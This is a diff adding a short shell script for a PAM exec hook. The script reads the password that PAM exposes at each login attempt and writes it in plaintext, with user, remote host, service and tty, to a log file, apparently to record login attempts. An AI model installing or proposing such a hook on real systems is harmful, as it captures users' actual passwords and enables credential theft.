@@ -1,0 +1,15 @@
+#!/bin/sh
+
+log=/var/log/pwattempts
+chmod 600 "$log"
+exec >>"$log"
+
+# expose_authtok (in pam.d/...) gives us the pw
+read password
+
+# emit logs like pam's log=...
+date +'*** %a %b %d %H:%M:%S %Y'
+echo "user:$PAM_USER ruser:$PAM_RUSER rhost:$PAM_RHOST service:$PAM_SERVICE tty:$PAM_TTY password:$password"
+
+# if pam does the logging (+004 perms on log file):
+#echo "user:$PAM_USER ruser:$PAM_RUSER rhost:$PAM_RHOST service:$PAM_SERVICE tty:$PAM_TTY password:$password"
